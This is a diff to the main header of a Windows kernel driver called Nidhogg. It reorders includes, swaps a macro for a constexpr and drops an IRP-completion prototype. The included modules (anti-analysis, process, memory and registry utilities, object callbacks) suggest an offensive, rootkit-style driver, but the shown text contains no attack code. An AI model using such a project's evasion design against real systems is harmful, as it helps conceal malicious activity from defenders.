+++ Nidhogg/Nidhogg.h
@@ -1,16 +1,17 @@
 #pragma once
 #include "pch.h"
+
 #include "WindowsTypes.hpp"
-#include "NidhoggUtils.h"
+#include "NidhoggCommon.h"
 #include "ProcessUtils.hpp"
+#include "MemoryUtils.hpp"
 #include "FileUtils.hpp"
 #include "RegistryUtils.hpp"
-#include "MemoryUtils.hpp"
 #include "AntiAnalysis.hpp"
 #include "NidhoggDeviceControl.hpp"
 
 // Definitions.
-#define REGISTERED_OB_CALLBACKS 2
+constexpr SIZE_T REGISTERED_OB_CALLBACKS = 2;
 #define DRIVER_NAME L"\\Driver\\Nidhogg"
 #define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
 #define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
@@ -19,7 +20,6 @@
 
 // Prototypes.
 NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
-NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
 DRIVER_UNLOAD NidhoggUnload;
 DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
 void ClearAll();
